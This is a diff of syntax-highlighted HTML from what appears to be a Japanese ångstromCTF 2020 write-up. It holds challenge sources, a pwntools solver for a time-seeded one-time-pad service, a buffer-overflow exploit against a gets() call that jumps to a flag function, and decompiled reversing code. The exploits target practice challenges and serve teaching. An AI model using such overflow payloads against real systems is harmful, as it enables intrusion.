+	p <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join([string<span style="color:#f92672">.</span>ascii_letters[random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, len(string<span style="color:#f92672">.</span>ascii_letters)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)] <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">30</span>))])
+	k <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join([string<span style="color:#f92672">.</span>ascii_letters[random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, len(string<span style="color:#f92672">.</span>ascii_letters)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)] <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(len(p))])
 
 	x <span style="color:#f92672">=</span> otp(p, k)
 
@@ -986,28 +986,28 @@ Wrong! The correct answer was w with key r
 
 random<span style="color:#f92672">.</span>seed(int(time<span style="color:#f92672">.</span>time()))
 
-<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Welcome to my one time pad service!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">It&#39;s so unbreakable that *if* you do manage to decrypt my text, I&#39;ll give you a flag!&#34;</span>)
-<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;You will be given the ciphertext and key for samples, and the ciphertext for when you try to decrypt. All will be given in base 64, but when you enter your answer, give it in ASCII.&#34;</span>)
-<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Enter:&#34;</span>)
-<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">1) Request sample&#34;</span>)
-<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">2) Try your luck at decrypting something!&#34;</span>)
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Welcome to my one time pad service!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">It</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">s so unbreakable that *if* you do manage to decrypt my text, I</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">ll give you a flag!</span><span style="color:#e6db74">&#34;</span>)
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">You will be given the ciphertext and key for samples, and the ciphertext for when you try to decrypt. All will be given in base 64, but when you enter your answer, give it in ASCII.</span><span style="color:#e6db74">&#34;</span>)
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Enter:</span><span style="color:#e6db74">&#34;</span>)
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">1) Request sample</span><span style="color:#e6db74">&#34;</span>)
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">2) Try your luck at decrypting something!</span><span style="color:#e6db74">&#34;</span>)
 
 <span style="color:#66d9ef">while</span> True:
-	choice <span style="color:#f92672">=</span> int(input(<span style="color:#e6db74">&#34;&gt; &#34;</span>))
+	choice <span style="color:#f92672">=</span> int(input(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&gt; </span><span style="color:#e6db74">&#34;</span>))
 	<span style="color:#66d9ef">if</span> choice <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
 		x, p, k <span style="color:#f92672">=</span> genSample()
-		<span style="color:#66d9ef">print</span>(base64<span style="color:#f92672">.</span>b64encode(x<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>decode(), <span style="color:#e6db74">&#34;with key&#34;</span>, base64<span style="color:#f92672">.</span>b64encode(k<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>decode())
+		<span style="color:#66d9ef">print</span>(base64<span style="color:#f92672">.</span>b64encode(x<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>decode(), <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">with key</span><span style="color:#e6db74">&#34;</span>, base64<span style="color:#f92672">.</span>b64encode(k<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>decode())
 
 	<span style="color:#66d9ef">elif</span> choice <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>:
 		x, p, k <span style="color:#f92672">=</span> genSample()
 		<span style="color:#66d9ef">print</span>(base64<span style="color:#f92672">.</span>b64encode(x<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>decode())
-		a <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Your answer: &#34;</span>)<span style="color:#f92672">.</span>strip()
+		a <span style="color:#f92672">=</span> input(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Your answer: </span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>strip()
 		<span style="color:#66d9ef">if</span> a <span style="color:#f92672">==</span> p:
-			<span style="color:#66d9ef">print</span>(os<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;FLAG&#34;</span>))
+			<span style="color:#66d9ef">print</span>(os<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">FLAG</span><span style="color:#e6db74">&#34;</span>))
 			<span style="color:#66d9ef">break</span>
 
 		<span style="color:#66d9ef">else</span>:
-			<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Wrong! The correct answer was&#34;</span>, p, <span style="color:#e6db74">&#34;with key&#34;</span>, k)
+			<span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Wrong! The correct answer was</span><span style="color:#e6db74">&#34;</span>, p, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">with key</span><span style="color:#e6db74">&#34;</span>, k)
 
 </code></pre></div><p>以下の部分より、乱数シードは時間によって決まることが分かります。</p>
 <p><code>random.seed(int(time.time()))</code></p>
@@ -1023,18 +1023,18 @@ random<span style="color:#f92672">.</span>seed(int(time<span style="color:#f9267
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
 <span style="color:#75715e"># 複数接続</span>
-io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;misc.2020.chall.actf.co&#39;</span>, <span style="color:#ae81ff">20301</span>)
-io2 <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;misc.2020.chall.actf.co&#39;</span>, <span style="color:#ae81ff">20301</span>)
+io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">misc.2020.chall.actf.co</span><span style="color:#e6db74">&#39;</span>, <span style="color:#ae81ff">20301</span>)
+io2 <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">misc.2020.chall.actf.co</span><span style="color:#e6db74">&#39;</span>, <span style="color:#ae81ff">20301</span>)
 
 io<span style="color:#f92672">.</span>recv()
 io2<span style="color:#f92672">.</span>recv()
 
-io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
-io2<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
+io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">2</span><span style="color:#e6db74">&#39;</span>)
+io2<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">2</span><span style="color:#e6db74">&#39;</span>)
 <span style="color:#66d9ef">print</span>(io<span style="color:#f92672">.</span>recv())
 <span style="color:#66d9ef">print</span>(io2<span style="color:#f92672">.</span>recv())
-io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;nandemoi-yo&#39;</span>)
-io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;answer was &#39;</span>)
+io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">nandemoi-yo</span><span style="color:#e6db74">&#39;</span>)
+io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">answer was </span><span style="color:#e6db74">&#39;</span>)
 ans <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>split()[<span style="color:#ae81ff">0</span>]
 <span style="color:#66d9ef">print</span>(ans)
 io2<span style="color:#f92672">.</span>sendline(ans)
@@ -1056,12 +1056,12 @@ b<span style="color:#e6db74">&#39;actf{one_time_pad_more_like_i_dont_like_crypto
 Can you call the flag function in this program (source)? 
 Try it out on the shell server at /problems/2020/no_canary or by connecting with nc shell.actf.co 20700.
 </code></pre><p>とりあえずソースを見てみましょう。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#</span><span style="color:#75715e">include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span><span style="color:#75715e">#</span><span style="color:#75715e">include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span><span style="color:#75715e">#</span><span style="color:#75715e">include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e"></span>
 <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">flag</span>() {
-	system(<span style="color:#e6db74">&#34;/bin/cat flag.txt&#34;</span>);
+	system(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/bin/cat flag.txt</span><span style="color:#e6db74">&#34;</span>);
 }
 
 <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
@@ -1070,25 +1070,25 @@ Try it out on the shell server at /problems/2020/no_canary or by connecting with
 	gid_t gid <span style="color:#f92672">=</span> getegid();
 	setresgid(gid, gid, gid);
 
-	puts(<span style="color:#e6db74">&#34;Ahhhh, what a beautiful morning on the farm!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-	puts(<span style="color:#e6db74">&#34;       _.-^-._    .--.&#34;</span>);
-	puts(<span style="color:#e6db74">&#34;    .-&#39;   _   &#39;-. |__|&#34;</span>);
-	puts(<span style="color:#e6db74">&#34;   /     |_|     </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">|  |&#34;</span>);
-	puts(<span style="color:#e6db74">&#34;  /               </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">  |&#34;</span>);
-	puts(<span style="color:#e6db74">&#34; /|     _____     |</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74"> |&#34;</span>);
-	puts(<span style="color:#e6db74">&#34;  |    |==|==|    |  |&#34;</span>);
-	puts(<span style="color:#e6db74">&#34;  |    |--|--|    |  |&#34;</span>);
-	puts(<span style="color:#e6db74">&#34;  |    |==|==|    |  |&#34;</span>);
-	puts(<span style="color:#e6db74">&#34;^^^^^^^^^^^^^^^^^^^^^^^^</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-	puts(<span style="color:#e6db74">&#34;Wait, what? It&#39;s already noon!&#34;</span>);
-	puts(<span style="color:#e6db74">&#34;Why didn&#39;t my canary wake me up?&#34;</span>);
-	puts(<span style="color:#e6db74">&#34;Well, sorry if I kept you waiting.&#34;</span>);
-	printf(<span style="color:#e6db74">&#34;What&#39;s your name? &#34;</span>);
+	puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Ahhhh, what a beautiful morning on the farm!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+	puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">       _.-^-._    .--.</span><span style="color:#e6db74">&#34;</span>);
+	puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">    .-&#39;   _   &#39;-. |__|</span><span style="color:#e6db74">&#34;</span>);
+	puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">   /     |_|     </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">|  |</span><span style="color:#e6db74">&#34;</span>);
+	puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">  /               </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">  |</span><span style="color:#e6db74">&#34;</span>);
+	puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74"> /|     _____     |</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74"> |</span><span style="color:#e6db74">&#34;</span>);
+	puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">  |    |==|==|    |  |</span><span style="color:#e6db74">&#34;</span>);
+	puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">  |    |--|--|    |  |</span><span style="color:#e6db74">&#34;</span>);
+	puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">  |    |==|==|    |  |</span><span style="color:#e6db74">&#34;</span>);
+	puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">^^^^^^^^^^^^^^^^^^^^^^^^</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+	puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Wait, what? It&#39;s already noon!</span><span style="color:#e6db74">&#34;</span>);
+	puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Why didn&#39;t my canary wake me up?</span><span style="color:#e6db74">&#34;</span>);
+	puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Well, sorry if I kept you waiting.</span><span style="color:#e6db74">&#34;</span>);
+	printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">What&#39;s your name? </span><span style="color:#e6db74">&#34;</span>);
 
 	<span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">20</span>];
 	gets(name);
 
-	printf(<span style="color:#e6db74">&#34;Nice to meet you, %s!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, name);
+	printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Nice to meet you, %s!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, name);
 }
 </code></pre></div><p><code>flag()</code>関数を実行できれば良さそうですが、<code>main()</code>関数から<code>flag()</code>関数に行くような処理はありません。</p>
 <p><code>gets()</code>関数が使われているのが気になります。</p>
@@ -1134,9 +1134,9 @@ Ahhhh, what a beautiful morning on the farm!
    /     |_|     <span style="color:#ae81ff">\|</span>  |
   /               <span style="color:#ae81ff">\ </span> |
  /|     _____     |<span style="color:#ae81ff">\ </span>|
-  |    |<span style="color:#f92672">==</span>|<span style="color:#f92672">==</span>|    |  |
+  |    |<span style="color:#f92672">=</span><span style="color:#f92672">=</span>|<span style="color:#f92672">=</span><span style="color:#f92672">=</span>|    |  |
   |    |--|--|    |  |
-  |    |<span style="color:#f92672">==</span>|<span style="color:#f92672">==</span>|    |  |
+  |    |<span style="color:#f92672">=</span><span style="color:#f92672">=</span>|<span style="color:#f92672">=</span><span style="color:#f92672">=</span>|    |  |
 ^^^^^^^^^^^^^^^^^^^^^^^^
 
 Wait, what? It<span style="color:#e6db74">&#39;s already noon!
@@ -1172,11 +1172,11 @@ AA0AAFAAbA found at offset: <span style="color:#ae81ff">40</span>
 
 flag_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401186</span>
 
-io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;shell.actf.co&#39;</span>, <span style="color:#ae81ff">20700</span>)
+io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">shell.actf.co</span><span style="color:#e6db74">&#39;</span>, <span style="color:#ae81ff">20700</span>)
 
 io<span style="color:#f92672">.</span>recv()
 
-payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">40</span> <span style="color:#f92672">+</span> p64(flag_addr)
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">40</span> <span style="color:#f92672">+</span> p64(flag_addr)
 io<span style="color:#f92672">.</span>sendline(payload)
 
 io<span style="color:#f92672">.</span>interactive()
@@ -1190,9 +1190,9 @@ io<span style="color:#f92672">.</span>interactive()
    /     |_|     <span style="color:#ae81ff">\|</span>  |
   /               <span style="color:#ae81ff">\ </span> |
  /|     _____     |<span style="color:#ae81ff">\ </span>|
-  |    |<span style="color:#f92672">==</span>|<span style="color:#f92672">==</span>|    |  |
+  |    |<span style="color:#f92672">=</span><span style="color:#f92672">=</span>|<span style="color:#f92672">=</span><span style="color:#f92672">=</span>|    |  |
   |    |--|--|    |  |
-  |    |<span style="color:#f92672">==</span>|<span style="color:#f92672">==</span>|    |  |
+  |    |<span style="color:#f92672">=</span><span style="color:#f92672">=</span>|<span style="color:#f92672">=</span><span style="color:#f92672">=</span>|    |  |
 ^^^^^^^^^^^^^^^^^^^^^^^^
 
 Wait, what? It<span style="color:#e6db74">&#39;s already noon!
@@ -1268,38 +1268,38 @@ Don<span style="color:#e6db74">&#39;t try to guess the arguments, it won&#39;</s
   <span style="color:#66d9ef">long</span> local_10;
   
   local_10 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>);
-  puts(<span style="color:#e6db74">&#34;So you figured out how to provide input and command line arguments.&#34;</span>);
-  puts(<span style="color:#e6db74">&#34;But can you figure out what input to provide?&#34;</span>);
-  <span style="color:#66d9ef">if</span> (iParm1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">5</span>) {
+  puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">So you figured out how to provide input and command line arguments.</span><span style="color:#e6db74">&#34;</span>);
+  puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">But can you figure out what input to provide?</span><span style="color:#e6db74">&#34;</span>);
+  <span style="color:#66d9ef">if</span> (iParm1 <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>) {
     string_to_int(<span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)(lParm2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>),<span style="color:#f92672">&amp;</span>local_b4,<span style="color:#f92672">&amp;</span>local_b4);
     string_to_int(<span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)(lParm2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>),<span style="color:#f92672">&amp;</span>local_b0,<span style="color:#f92672">&amp;</span>local_b0);
     string_to_int(<span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)(lParm2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>),<span style="color:#f92672">&amp;</span>local_ac,<span style="color:#f92672">&amp;</span>local_ac);
     iVar1 <span style="color:#f92672">=</span> is_invalid((ulong)local_b4);
-    <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+    <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>) {
       iVar1 <span style="color:#f92672">=</span> is_invalid((ulong)local_b0);
-      <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+      <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>) {
         iVar1 <span style="color:#f92672">=</span> is_invalid((ulong)local_ac);
-        <span style="color:#66d9ef">if</span> ((iVar1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;&amp;</span> (local_ac <span style="color:#f92672">+</span> local_b0 <span style="color:#f92672">*</span> <span style="color:#ae81ff">100</span> <span style="color:#f92672">+</span> local_b4 <span style="color:#f92672">*</span> <span style="color:#ae81ff">10</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x3a4</span>)) {
-          iVar1 <span style="color:#f92672">=</span> strcmp(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)(lParm2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>),<span style="color:#e6db74">&#34;chicken&#34;</span>);
-          <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
-            puts(<span style="color:#e6db74">&#34;Well, you found the arguments, but what</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">s the password?&#34;</span>);
+        <span style="color:#66d9ef">if</span> ((iVar1 <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;</span><span style="color:#f92672">&amp;</span> (local_ac <span style="color:#f92672">+</span> local_b0 <span style="color:#f92672">*</span> <span style="color:#ae81ff">100</span> <span style="color:#f92672">+</span> local_b4 <span style="color:#f92672">*</span> <span style="color:#ae81ff">10</span> <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3a4</span>)) {
+          iVar1 <span style="color:#f92672">=</span> strcmp(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#f92672">*</span>)(lParm2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>),<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">chicken</span><span style="color:#e6db74">&#34;</span>);
+          <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>) {
+            puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Well, you found the arguments, but what</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">s the password?</span><span style="color:#e6db74">&#34;</span>);
             fgets((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)local_98,<span style="color:#ae81ff">0x80</span>,stdin);
             local_a0 <span style="color:#f92672">=</span> strchr((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)local_98,<span style="color:#ae81ff">10</span>);
-            <span style="color:#66d9ef">if</span> (local_a0 <span style="color:#f92672">!=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) {
-              <span style="color:#f92672">*</span>local_a0 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
+            <span style="color:#66d9ef">if</span> (local_a0 <span style="color:#f92672">!</span><span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) {
+              <span style="color:#f92672">*</span>local_a0 <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">\0</span><span style="color:#e6db74">&#39;</span>;
             }
             sVar3 <span style="color:#f92672">=</span> strlen((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)local_98);
             local_a4 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>)sVar3;
             local_a8 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-            <span style="color:#66d9ef">while</span> (local_a8 <span style="color:#f92672">&lt;=</span> local_a4) {
-              <span style="color:#66d9ef">if</span> ((local_98[(<span style="color:#66d9ef">long</span>)local_a8] <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x2a</span>) <span style="color:#f92672">!=</span> desired[(<span style="color:#66d9ef">long</span>)local_a8]) {
-                puts(<span style="color:#e6db74">&#34;I</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">m sure it</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">s just a typo. Try again.&#34;</span>);
+            <span style="color:#66d9ef">while</span> (local_a8 <span style="color:#f92672">&lt;</span><span style="color:#f92672">=</span> local_a4) {
+              <span style="color:#66d9ef">if</span> ((local_98[(<span style="color:#66d9ef">long</span>)local_a8] <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x2a</span>) <span style="color:#f92672">!</span><span style="color:#f92672">=</span> desired[(<span style="color:#66d9ef">long</span>)local_a8]) {
+                puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">I</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">m sure it</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">s just a typo. Try again.</span><span style="color:#e6db74">&#34;</span>);
                 uVar2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
                 <span style="color:#66d9ef">goto</span> LAB_00400bc7;
               }
               local_a8 <span style="color:#f92672">=</span> local_a8 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
             }
-            puts(<span style="color:#e6db74">&#34;Good job! You</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">re ready to move on to bigger and badder rev!&#34;</span>);
+            puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Good job! You</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">re ready to move on to bigger and badder rev!</span><span style="color:#e6db74">&#34;</span>);
             print_flag();
             uVar2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
             <span style="color:#66d9ef">goto</span> LAB_00400bc7;
@@ -1307,23 +1307,23 @@ Don<span style="color:#e6db74">&#39;t try to guess the arguments, it won&#39;</s
         }
       }
     }
-    puts(<span style="color:#e6db74">&#34;Don</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">t try to guess the arguments, it won</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">t work.&#34;</span>);
+    puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Don</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">t try to guess the arguments, it won</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">t work.</span><span style="color:#e6db74">&#34;</span>);
     uVar2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
   }
   <span style="color:#66d9ef">else</span> {
-    puts(<span style="color:#e6db74">&#34;Make sure you have the correct amount of command line arguments!&#34;</span>);
+    puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Make sure you have the correct amount of command line arguments!</span><span style="color:#e6db74">&#34;</span>);
     uVar2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
   }
 LAB_00400bc7:
-  <span style="color:#66d9ef">if</span> (local_10 <span style="color:#f92672">!=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>)) {
+  <span style="color:#66d9ef">if</span> (local_10 <span style="color:#f92672">!</span><span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>)) {
                     <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
     __stack_chk_fail();
   }
   <span style="color:#66d9ef">return</span> uVar2;
 }
